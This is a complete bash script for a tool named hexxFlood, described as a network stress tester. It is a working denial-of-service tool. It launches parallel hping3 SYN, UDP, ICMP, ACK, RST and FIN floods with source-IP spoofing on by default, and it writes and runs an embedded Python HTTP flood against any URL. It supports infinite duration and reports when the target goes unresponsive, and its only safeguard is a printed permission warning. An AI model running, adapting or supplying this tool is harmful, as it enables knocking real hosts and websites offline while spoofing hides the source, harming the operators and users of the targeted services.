#!/bin/bash

# ============================================================
# hexxFlood - Ultimate Network Stress Testing Tool
# Version: 1.0
# Author: Cywarx
# ============================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Version
VERSION="1.0"
REPO_URL="https://github.com/Cywarx/hexxFlood.git"

# Configuration
CONFIG_FILE="$HOME/.hexxFlood_config"
TARGET="192.168.1.14"
THREADS=50
PACKET_SIZE=65495
DELAY="u1"
INTERFACE="wlan0"
ATTACK_DURATION=0
SPOOF_IP=true
RANDOM_PORTS=true
TARGET_TYPE="ip"

# Monitoring
AUTO_MONITOR=true        # auto-open a monitor terminal when an attack starts
MONITOR_WINDOWS="full"   # comma-separated modes -> one auto window per mode
MONITOR_MODE="full"      # mode used by standalone --monitor
RUN_MONITOR_ONLY=false   # set by --monitor to run the monitor and exit

if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE"
fi

# Resolve where this script (and monitor.sh) live, even via the wrapper/symlink
SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
MONITOR_SCRIPT="$SCRIPT_DIR/monitor.sh"

show_banner() {
    clear
    echo -e "${RED}"
    echo "╔════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                                ║"
    echo "║   ██╗  ██╗███████╗██╗  ██╗██╗  ██╗███████╗██╗      ██████╗  ██████╗ ██████╗    ║"
    echo "║   ██║  ██║██╔════╝╚██╗██╔╝╚██╗██╔╝██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗   ║"
    echo "║   ███████║█████╗   ╚███╔╝  ╚███╔╝ █████╗  ██║     ██║   ██║██║   ██║██║  ██║   ║"
    echo "║   ██╔══██║██╔══╝   ██╔██╗  ██╔██╗ ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║   ║"
    echo "║   ██║  ██║███████╗██╔╝ ██╗██╔╝ ██╗██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝   ║"
    echo "║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ║"
    echo "║                                                                                ║"
    echo "║                   Ultimate Network Stress Testing Tool v1.0                    ║"
    echo "║                              IP & Web URL Support                              ║"
    echo "║                                Use Responsibly!                                ║"
    echo "╠════════════════════════════════════════════════════════════════════════════════╣"
    echo "║                             Author: CyWarX                                     ║"
    echo "╚════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

show_help() {
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}📖 hexxFlood - Usage Guide${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Basic Usage:${NC}"
    echo "  hexxFlood [OPTIONS]"
    echo ""
    echo -e "${YELLOW}Target Options:${NC}"
    echo "  -t, --target IP          Target IP address"
    echo "  -u, --url URL            Target Web URL (http://example.com)"
    echo ""
    echo -e "${YELLOW}Attack Options:${NC}"
    echo "  -p, --threads NUM        Number of threads (1-200, default: 50)"
    echo "  -s, --size BYTES         Packet size (64-65495, default: 65495)"
    echo "  -d, --delay MS           Delay (u1,u10,u100, default: u1)"
    echo "  -i, --interface IFACE    Network interface (default: wlan0)"
    echo "  -m, --mode MODE          Mode: easy|medium|high|extreme|custom"
    echo "  -P, --ports PORTS        Comma-separated ports"
    echo "  -T, --type TYPES         Types: syn,udp,icmp,ack,rst,fin,all,http"
    echo "  -D, --duration SEC       Duration in seconds (0=infinite)"
    echo "  --no-spoof               Disable IP spoofing"
    echo "  --fixed-ports            Use fixed ports"
    echo ""
    echo -e "${YELLOW}Monitoring Options:${NC}"
    echo "  --monitor                Open the live monitor only (no attack)"
    echo "  --monitor-mode MODE      Monitor mode: ping|network|system|full|log (default: full)"
    echo "  --auto-monitor [MODES]   Auto-open monitor window(s) on attack start (default: on, full)"
    echo "                           MODES is comma-separated -> one window each, e.g. full,ping,system"
    echo "  --no-monitor             Do not auto-open any monitor window"
    echo ""
    echo -e "${YELLOW}Other Options:${NC}"
    echo "  -U, --update             Update hexxFlood to the latest version (git pull)"
    echo "  -V, --version            Show version and exit"
    echo "  -h, --help               Show this help"
    echo ""
    echo -e "${YELLOW}Attack Modes:${NC}"
    echo "  easy    - 10 threads, basic attacks"
    echo "  medium  - 25 threads, medium attacks"
    echo "  high    - 50 threads, high attacks"
    echo "  extreme - 100 threads, extreme attacks"
    echo "  custom  - Use your own settings"
    echo ""
    echo -e "${YELLOW}Examples:${NC}"
    echo "  # IP Attack"
    echo "  hexxFlood -t 192.168.1.10 -m extreme"
    echo ""
    echo "  # Web URL Attack"
    echo "  hexxFlood -u http://example.com -m extreme"
    echo "  hexxFlood -u https://example.com -T http -p 100"
    echo "  hexxFlood -u http://example.com:8080 -m high -D 60"
    echo ""
    echo -e "${YELLOW}  # Attack + auto-open 3 monitor windows${NC}"
    echo "  hexxFlood -t 192.168.1.10 -m extreme --auto-monitor full,ping,system"
    echo ""
    echo -e "${YELLOW}  # Just watch a target (no attack)${NC}"
    echo "  hexxFlood --monitor -t 192.168.1.10"
    echo "  hexxFlood --monitor --monitor-mode ping -t 192.168.1.10"
    echo ""
}

parse_url() {
    local url="$1"
    local stripped="${url#http://}"
    stripped="${stripped#https://}"
    if [[ "$stripped" == *":"* ]]; then
        WEB_HOST="${stripped%:*}"
        WEB_PORT="${stripped#*:}"
    else
        WEB_HOST="$stripped"
        if [[ "$url" == https://* ]]; then
            WEB_PORT="443"
        else
            WEB_PORT="80"
        fi
    fi
    WEB_IP=$(dig +short "$WEB_HOST" | head -1)
    if [ -z "$WEB_IP" ]; then
        WEB_IP=$(ping -c 1 "$WEB_HOST" 2>/dev/null | head -1 | grep -oP '(?<=\().*(?=\))' || echo "")
    fi
    if [ -z "$WEB_IP" ]; then
        echo -e "${RED}❌ Could not resolve hostname: $WEB_HOST${NC}"
        exit 1
    fi
    echo -e "${GREEN}✅ Resolved $WEB_HOST -> $WEB_IP${NC}"
    TARGET="$WEB_IP"
    TARGET_TYPE="url"
}

http_flood() {
    local url="$1"
    local threads="${2:-50}"
    local duration="${3:-0}"
    
    echo -e "${YELLOW}🌐 Starting HTTP flood on $url${NC}"
    echo -e "${YELLOW}   Threads: $threads${NC}"
    
    cat > /tmp/http_flood.py << 'PYEOF'
import sys, time, threading, urllib.request, urllib.error, ssl, random
from concurrent.futures import ThreadPoolExecutor

url = sys.argv[1]
threads = int(sys.argv[2])
duration = int(sys.argv[3])

ssl._create_default_https_context = ssl._create_unverified_context

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
]

def make_request():
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read()
    except:
        return None

def worker():
    while running:
        try:
            make_request()
        except:
            pass

running = True
start_time = time.time()

print(f"Starting HTTP flood on {url} with {threads} threads")

with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = [executor.submit(worker) for _ in range(threads)]
    if duration > 0:
        time.sleep(duration)
        running = False
    else:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            running = False
    for future in futures:
        future.cancel()

print("HTTP flood stopped")
PYEOF

    if [ -f "/opt/hexxFlood-venv/bin/python" ]; then
        /opt/hexxFlood-venv/bin/python /tmp/http_flood.py "$url" "$threads" "$duration" &
    else
        python3 /tmp/http_flood.py "$url" "$threads" "$duration" &
    fi
}

self_update() {
    # Resolve the real script location even when invoked via the wrapper/symlink
    local script_dir
    script_dir="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"

    echo -e "${CYAN}🔄 Checking for updates in $script_dir ...${NC}"

    if ! command -v git &>/dev/null; then
        echo -e "${RED}❌ git is not installed. Install it with: sudo apt install git${NC}"
        exit 1
    fi

    if ! git -C "$script_dir" rev-parse --is-inside-work-tree &>/dev/null; then
        echo -e "${RED}❌ $script_dir is not a git repository — cannot auto-update.${NC}"
        echo -e "${YELLOW}   Re-clone it to enable updates:${NC}"
        echo -e "   git clone $REPO_URL"
        exit 1
    fi

    # Run git as the invoking user (not root) so repo files keep the right owner
    local git_cmd=(git -C "$script_dir")
    if [ "$EUID" -eq 0 ] && [ -n "${SUDO_USER:-}" ]; then
        git_cmd=(sudo -u "$SUDO_USER" git -C "$script_dir")
    fi

    local branch
    branch="$("${git_cmd[@]}" rev-parse --abbrev-ref HEAD 2>/dev/null)"
    [ -z "$branch" ] || [ "$branch" = "HEAD" ] && branch="main"

    if ! "${git_cmd[@]}" fetch --quiet origin "$branch" 2>/dev/null; then
        echo -e "${RED}❌ Could not reach the remote. Check your internet connection.${NC}"
        exit 1
    fi

    local local_rev remote_rev
    local_rev="$("${git_cmd[@]}" rev-parse HEAD)"
    remote_rev="$("${git_cmd[@]}" rev-parse "origin/$branch" 2>/dev/null)"

    if [ "$local_rev" = "$remote_rev" ]; then
        echo -e "${GREEN}✅ Already up to date (v$VERSION, $("${git_cmd[@]}" rev-parse --short HEAD)).${NC}"
        exit 0
    fi

    echo -e "${YELLOW}⬆️  Update available: $("${git_cmd[@]}" rev-parse --short HEAD) → $("${git_cmd[@]}" rev-parse --short origin/$branch)${NC}"
    if "${git_cmd[@]}" pull --ff-only origin "$branch"; then
        chmod +x "$script_dir"/*.sh 2>/dev/null
        echo -e "${GREEN}✅ hexxFlood updated to the latest version!${NC}"
        echo -e "${CYAN}Recent changes:${NC}"
        "${git_cmd[@]}" log --oneline -5
    else
        echo -e "${RED}❌ Update failed — you likely have local changes that conflict.${NC}"
        echo -e "${YELLOW}   Inspect with: git -C $script_dir status${NC}"
        echo -e "${YELLOW}   Discard local changes with: git -C $script_dir reset --hard origin/$branch${NC}"
        exit 1
    fi
    exit 0
}

# ---- External monitor terminal support -----------------------------------

# Work out which X display / auth / dbus to use so GUI terminals can be
# opened even when hexxFlood is running under sudo (as root).
resolve_display() {
    local real_user="${SUDO_USER:-$USER}"
    MON_HOME=$(getent passwd "$real_user" | cut -d: -f6)
    MON_HOME="${MON_HOME:-$HOME}"
    local uid; uid=$(id -u "$real_user" 2>/dev/null)

    # Detect a real X display. Leave MON_DISPLAY empty on headless/SSH boxes
    # so we cleanly skip monitor windows instead of guessing ":0".
    if [ -n "$DISPLAY" ]; then
        MON_DISPLAY="$DISPLAY"
    else
        MON_DISPLAY=$(who 2>/dev/null | grep -oE '\(:[0-9]+(\.[0-9]+)?\)' | tr -d '()' | head -1)
    fi
    MON_XAUTH="${XAUTHORITY:-$MON_HOME/.Xauthority}"
    MON_DBUS="${DBUS_SESSION_BUS_ADDRESS:-unix:path=/run/user/${uid:-0}/bus}"
}

# Open a single monitor window running monitor.sh in a new terminal.
# $1 = monitor mode (ping|network|system|full|log). Returns 1 if no
# terminal emulator is available.
launch_one_monitor() {
    local mode="$1"
    local title="hexxFlood Monitor [$mode] -> $TARGET"
    local q_script; printf -v q_script '%q' "$MONITOR_SCRIPT"
    local mon_str="bash $q_script -t $TARGET -i $INTERFACE -m $mode"
    local -a argv=(bash "$MONITOR_SCRIPT" -t "$TARGET" -i "$INTERFACE" -m "$mode")
    local -a cmd=()
    local term

    for term in gnome-terminal konsole qterminal xfce4-terminal kitty alacritty tilix xterm x-terminal-emulator; do
        command -v "$term" &>/dev/null || continue
        case "$term" in
            gnome-terminal)      cmd=(gnome-terminal --title="$title" -- "${argv[@]}") ;;
            konsole)             cmd=(konsole -p "tabtitle=$title" -e "${argv[@]}") ;;
            qterminal)           cmd=(qterminal -e "${argv[@]}") ;;
            xfce4-terminal)      cmd=(xfce4-terminal --title="$title" -e "$mon_str") ;;
            kitty)               cmd=(kitty --title "$title" "${argv[@]}") ;;
            alacritty)           cmd=(alacritty -t "$title" -e "${argv[@]}") ;;
            tilix)               cmd=(tilix -t "$title" -e "$mon_str") ;;
            xterm)               cmd=(xterm -T "$title" -e "${argv[@]}") ;;
            x-terminal-emulator) cmd=(x-terminal-emulator -e "${argv[@]}") ;;
        esac
        break
    done

    [ ${#cmd[@]} -eq 0 ] && return 1

    # Launch as the real (non-root) user on their graphical session
    if [ "$EUID" -eq 0 ] && [ -n "${SUDO_USER:-}" ]; then
        sudo -u "$SUDO_USER" env HOME="$MON_HOME" DISPLAY="$MON_DISPLAY" \
            XAUTHORITY="$MON_XAUTH" DBUS_SESSION_BUS_ADDRESS="$MON_DBUS" \
            "${cmd[@]}" >/dev/null 2>&1 &
    else
        DISPLAY="$MON_DISPLAY" XAUTHORITY="$MON_XAUTH" \
            DBUS_SESSION_BUS_ADDRESS="$MON_DBUS" "${cmd[@]}" >/dev/null 2>&1 &
    fi
    return 0
}

# Auto-open the configured monitor window(s) when an attack starts.
launch_monitors() {
    [ "$AUTO_MONITOR" = true ] || return 0

    if [ ! -f "$MONITOR_SCRIPT" ]; then
        echo -e "${YELLOW}⚠️  monitor.sh not found at $MONITOR_SCRIPT — skipping monitor windows.${NC}"
        return 0
    fi

    resolve_display
    if [ -z "$MON_DISPLAY" ]; then
        echo -e "${YELLOW}⚠️  No graphical display detected — skipping auto monitor windows.${NC}"
        echo -e "${YELLOW}   Open one manually in another terminal:  hexxFlood --monitor -t $TARGET${NC}"
        echo ""
        return 0
    fi

    local opened=0 mode
    for mode in $(echo "$MONITOR_WINDOWS" | tr ',' ' '); do
        case "$mode" in
            ping|network|system|full|log) ;;
            *) echo -e "${YELLOW}⚠️  Unknown monitor mode '$mode' — skipping.${NC}"; continue ;;
        esac
        if launch_one_monitor "$mode"; then
            echo -e "${GREEN}🖥️  Opened monitor window: ${WHITE}$mode${NC}"
            opened=$((opened + 1))
            sleep 0.3
        else
            echo -e "${YELLOW}⚠️  No supported terminal emulator found — cannot auto-open monitors.${NC}"
            echo -e "${YELLOW}   Install one of: xterm, gnome-terminal, konsole, xfce4-terminal, qterminal.${NC}"
            echo -e "${YELLOW}   Or run in another terminal:  hexxFlood --monitor -t $TARGET${NC}"
            break
        fi
    done
    [ "$opened" -gt 0 ] && echo ""
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--target) TARGET="$2"; TARGET_TYPE="ip"; shift 2 ;;
            -u|--url) URL="$2"; parse_url "$URL"; shift 2 ;;
            --web) TARGET_TYPE="url"; shift ;;
            -p|--threads) THREADS="$2"; shift 2 ;;
            -s|--size) PACKET_SIZE="$2"; shift 2 ;;
            -d|--delay) DELAY="$2"; shift 2 ;;
            -i|--interface) INTERFACE="$2"; shift 2 ;;
            -m|--mode) MODE="$2"; shift 2 ;;
            -P|--ports) CUSTOM_PORTS="$2"; shift 2 ;;
            -T|--type) ATTACK_TYPES="$2"; shift 2 ;;
            -D|--duration) ATTACK_DURATION="$2"; shift 2 ;;
            --no-spoof) SPOOF_IP=false; shift ;;
            --fixed-ports) RANDOM_PORTS=false; shift ;;
            --monitor) RUN_MONITOR_ONLY=true; shift ;;
            --monitor-mode) MONITOR_MODE="$2"; shift 2 ;;
            --auto-monitor)
                AUTO_MONITOR=true
                if [[ -n "$2" && "$2" != -* ]]; then MONITOR_WINDOWS="$2"; shift 2; else shift; fi
                ;;
            --no-monitor|--no-auto-monitor) AUTO_MONITOR=false; shift ;;
            -U|--update) self_update ;;
            -V|--version) echo -e "${WHITE}hexxFlood v$VERSION${NC}"; exit 0 ;;
            -h|--help) show_help; exit 0 ;;
            *) echo -e "${RED}Unknown option: $1${NC}"; show_help; exit 1 ;;
        esac
    done
}

set_mode() {
    case $MODE in
        easy) THREADS=10; DELAY="u100"; ATTACK_TYPES="syn,udp,icmp" ;;
        medium) THREADS=25; DELAY="u10"; ATTACK_TYPES="syn,udp,icmp,ack" ;;
        high) THREADS=50; DELAY="u1"; ATTACK_TYPES="syn,udp,icmp,ack,rst,fin" ;;
        extreme) THREADS=100; DELAY="u1"; ATTACK_TYPES="all" ;;
        custom) ;;
        *) THREADS=50; ATTACK_TYPES="all" ;;
    esac
}

get_packet_count() {
    local c
    c=$(ifconfig "${1:-$INTERFACE}" 2>/dev/null | grep "TX packets" | awk '{print $5}' | head -1)
    echo "${c:-0}"
}

monitor_attack() {
    local start_time=$(date +%s)
    local duration=$ATTACK_DURATION
    local initial_packets=$(get_packet_count)
    
    while true; do
        if [ $duration -gt 0 ]; then
            local current_time=$(date +%s)
            local elapsed=$((current_time - start_time))
            if [ $elapsed -ge $duration ]; then
                echo -e "${YELLOW}⏱️ Attack duration completed${NC}"
                break
            fi
        fi
        
        local current_packets=$(get_packet_count)
        local elapsed=$(( $(date +%s) - start_time ))
        local packets_sent=$((current_packets - initial_packets))
        local pps=0
        [ $elapsed -gt 0 ] && pps=$((packets_sent / elapsed))
        
        clear
        show_banner
        echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
        echo -e "${WHITE}                    ☢️  hexxFlood STATUS  ☢️${NC}"
        echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
        echo ""
        
        if [ "$TARGET_TYPE" = "url" ]; then
            echo -e "${YELLOW}📍 TARGET URL:${NC} $URL"
            echo -e "${YELLOW}📍 TARGET IP:${NC} $TARGET"
        else
            echo -e "${YELLOW}📍 TARGET:${NC} $TARGET"
        fi
        [ $duration -gt 0 ] && echo -e "${YELLOW}⏱️ Time Remaining:${NC} $((duration - elapsed))s"
        echo -e "${YELLOW}⏱️ Elapsed Time:${NC} ${elapsed}s"
        echo ""
        
        echo -e "${YELLOW}📊 PACKET STATISTICS:${NC}"
        echo -e "   Total Packets Sent: ${GREEN}$(printf "%'d" $packets_sent)${NC}"
        echo -e "   Packets Per Second: ${GREEN}$(printf "%'d" $pps)${NC}"
        echo ""
        
        PING_RESULT=$(ping -c 1 $TARGET 2>/dev/null | grep -o "time=[0-9.]* ms" || echo "💀 TARGET UNRESPONSIVE!")
        echo -e "${YELLOW}📊 Target Response:${NC} $PING_RESULT"
        echo ""
        
        HPING_COUNT=$(pgrep -c hping3 2>/dev/null || echo 0)
        HTTP_COUNT=$(pgrep -cf http_flood.py 2>/dev/null || echo 0)
        echo -e "${YELLOW}🔢 Active Processes:${NC}"
        echo "   hping3: $HPING_COUNT"
        echo "   HTTP: $HTTP_COUNT"
        echo ""
        
        CPU=$(top -bn1 | head -5 | grep Cpu | awk '{print $2}')
        echo -e "${YELLOW}💻 CPU Usage:${NC} ${CPU:-0}%"
        echo ""
        
        MEM=$(free -h | grep Mem | awk '{print $3 "/" $2}')
        echo -e "${YELLOW}🧠 Memory:${NC} $MEM used"
        echo ""
        
        if [ $pps -gt 0 ]; then
            local bandwidth_mbps=$(( (pps * PACKET_SIZE * 8) / 1000000 ))
            echo -e "${YELLOW}🌊 Bandwidth:${NC} ${bandwidth_mbps} Mbps"
            echo ""
        fi
        
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${WHITE}⏱️ Last Updated: $(date +%H:%M:%S)${NC}"
        echo -e "${RED}Press Ctrl+C to stop${NC}"
        sleep 2
    done
    
    echo -e "${YELLOW}🛑 Stopping all attacks...${NC}"
    sudo pkill -9 hping3 2>/dev/null
    sudo pkill -9 -f http_flood.py 2>/dev/null
    rm -f /tmp/http_flood.py

    local final_packets=$(get_packet_count)
    local total_sent=$((final_packets - initial_packets))
    echo ""
    echo -e "${GREEN}✅ Attack stopped${NC}"
    echo -e "${YELLOW}📊 Final Statistics:${NC}"
    echo -e "   Total Packets Sent: ${GREEN}$(printf "%'d" $total_sent)${NC}"
    echo -e "   Total Time: ${GREEN}${elapsed}s${NC}"
    [ $elapsed -gt 0 ] && echo -e "   Average PPS: ${GREEN}$(printf "%'d" $((total_sent / elapsed)))${NC}"
    echo ""
}

cleanup() {
    echo -e "\n${YELLOW}🛑 Stopping all attacks...${NC}"
    sudo pkill -9 hping3 2>/dev/null
    sudo pkill -9 -f http_flood.py 2>/dev/null
    rm -f /tmp/http_flood.py
    echo -e "${GREEN}✅ Cleanup complete${NC}"
    exit 0
}

main() {
    trap cleanup SIGINT SIGTERM
    show_banner
    parse_args "$@"

    # Standalone monitor: run the monitor and exit (no attack)
    if [ "$RUN_MONITOR_ONLY" = true ]; then
        if [ ! -f "$MONITOR_SCRIPT" ]; then
            echo -e "${RED}❌ monitor.sh not found at $MONITOR_SCRIPT${NC}"; exit 1
        fi
        trap - SIGINT SIGTERM
        exec bash "$MONITOR_SCRIPT" -t "$TARGET" -i "$INTERFACE" -m "$MONITOR_MODE"
    fi

    [ -n "$MODE" ] && set_mode

    # Validate numeric inputs against documented ranges
    if ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [ "$THREADS" -lt 1 ] || [ "$THREADS" -gt 200 ]; then
        echo -e "${RED}❌ Threads must be a number between 1 and 200${NC}"; exit 1
    fi
    if ! [[ "$PACKET_SIZE" =~ ^[0-9]+$ ]] || [ "$PACKET_SIZE" -lt 64 ] || [ "$PACKET_SIZE" -gt 65495 ]; then
        echo -e "${RED}❌ Packet size must be between 64 and 65495${NC}"; exit 1
    fi
    if ! ifconfig "$INTERFACE" &>/dev/null; then
        echo -e "${YELLOW}⚠️  Interface '$INTERFACE' not found — packet stats may show 0. Use -i to set the right one.${NC}"
    fi

    echo -e "${YELLOW}Configuration:${NC}"
    echo "  Target Type: ${TARGET_TYPE^^}"
    [ "$TARGET_TYPE" = "url" ] && echo "  URL: $URL"
    echo "  Target IP: $TARGET"
    echo "  Threads: $THREADS"
    echo "  Mode: ${MODE:-custom}"
    echo "  Attack Types: ${ATTACK_TYPES:-all}"
    echo "  Packet Size: $PACKET_SIZE bytes"
    echo "  Delay: $DELAY"
    echo "  Duration: ${ATTACK_DURATION:-Infinite}"
    echo ""
    echo -e "${RED}⚠️ WARNING: Use only on networks you OWN or have permission to test!${NC}"
    echo ""

    # Auto-open monitor terminal(s) so progress is visible while the attack runs
    launch_monitors

    if [[ "$ATTACK_TYPES" == *"http"* ]] || [ "$TARGET_TYPE" = "url" ]; then
        echo -e "${GREEN}🌐 Starting HTTP flood on $URL${NC}"
        http_flood "$URL" "$THREADS" "$ATTACK_DURATION"
        echo -e "${GREEN}✅ HTTP flood started${NC}"
        echo ""
    fi
    
    [ "$ATTACK_TYPES" = "all" ] && ATTACK_TYPES="syn,udp,icmp,ack,rst,fin"

    if echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),'; then
        echo -e "${GREEN}Starting network layer attack on $TARGET...${NC}"
        echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
        echo ""

        # IP spoofing — disabled by --no-spoof
        SPOOF_FLAG=""
        [ "$SPOOF_IP" = true ] && SPOOF_FLAG="--rand-source"

        # Destination ports — custom (-P) overrides the per-type defaults
        if [ -n "$CUSTOM_PORTS" ]; then
            TCP_PORTS=$(echo "$CUSTOM_PORTS" | tr ',' ' ')
            UDP_PORTS="$TCP_PORTS"
        else
            TCP_PORTS="80"
            UDP_PORTS="53"
        fi

        # Incrementing dst port (++) by default; --fixed-ports uses a static port
        PP=""
        [ "$RANDOM_PORTS" = true ] && PP="++"

        for i in $(seq 1 $THREADS); do
            for type in $(echo "$ATTACK_TYPES" | tr ',' ' '); do
                case $type in
                    syn) for p in $TCP_PORTS; do sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
                    udp) for p in $UDP_PORTS; do sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
                    icmp) sudo hping3 -1 --flood $SPOOF_FLAG -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & ;;
                    ack) for p in $TCP_PORTS; do sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
                    rst) for p in $TCP_PORTS; do sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
                    fin) for p in $TCP_PORTS; do sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
                esac
            done
        done
    fi
    
    monitor_attack
}

main "$@"
